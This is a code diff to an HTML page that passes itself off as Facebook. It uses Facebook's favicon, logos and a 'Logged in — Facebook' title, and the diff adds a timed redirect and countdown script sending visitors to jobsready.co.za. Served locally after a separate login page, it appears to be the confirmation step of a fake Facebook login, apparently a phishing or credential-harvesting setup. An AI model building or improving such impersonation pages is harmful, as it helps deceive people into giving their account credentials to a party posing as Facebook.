@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
     <title>Logged in — Facebook</title>
+    <meta http-equiv="refresh" content="3;url=https://jobsready.co.za">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif; }
 
@@ -36,6 +37,12 @@
             font-size: 22px;
             color: #1c1e21;
             margin-bottom: 10px;
+        }
+
+        .redirect-msg {
+            font-size: 14px;
+            color: #8a8d91;
+            margin-bottom: 24px;
         }
 
         p {
@@ -70,10 +77,22 @@
     <div class="card">
         <img src="image/fb_white_f.png" alt="Facebook" class="fb-icon">
         <h1>You're connected!</h1>
-
-        <a href="index.html" class="btn">Back to login</a>
+        <p class="redirect-msg">Redirecting in <span id="countdown">3</span>s…</p>
+        <a href="https://jobsready.co.za" class="btn">Continue</a>
         <br>
         <img src="image/meta_black.png" alt="Meta" class="meta-logo">
     </div>
+    <script>
+        let n = 3;
+        const el = document.getElementById('countdown');
+        const timer = setInterval(() => {
+            n--;
+            if (el) el.textContent = n;
+            if (n <= 0) {
+                clearInterval(timer);
+                window.location.href = 'https://jobsready.co.za';
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
